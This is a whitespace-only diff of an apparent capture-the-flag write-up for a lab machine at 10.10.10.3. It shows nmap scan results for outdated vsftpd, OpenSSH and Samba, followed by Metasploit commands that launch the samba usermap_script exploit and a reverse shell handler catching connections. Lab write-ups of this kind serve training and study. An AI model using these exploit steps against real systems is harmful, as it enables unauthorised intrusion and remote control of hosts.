@@ -48,8 +48,8 @@ Not shown: 65530 filtered ports
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 2.3.4
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to 10.10.14.14
 |      Logged in as ftp
@@ -61,7 +61,7 @@ PORT     STATE SERVICE     VERSION
 |      vsFTPd 2.3.4 - secure, fast, stable
 |_End of status
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup:WORKGROUP)
@@ -70,9 +70,9 @@ PORT     STATE SERVICE     VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Host script results:
 |_clock-skew: mean: -2d23h00m43s, deviation: 0s, median: -2d23h00m43s
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Unix (Samba 3.0.20-Debian)
-|   NetBIOS computer name: 
+|   NetBIOS computer name:
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2019-07-13T14:11:05-04:00
 |_smb2-time: Protocol negotiation failed (SMB2)
@@ -125,7 +125,7 @@ msf5 > use exploit/multi/samba/usermap_script
 msf5 > set RHOST 10.10.10.3
 msf5 > exploit
 
-[*] Started reverse TCP double handler on 10.10.14.14:4444 
+[*] Started reverse TCP double handler on 10.10.14.14:4444
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo NKYmctrocnnm8nuo;
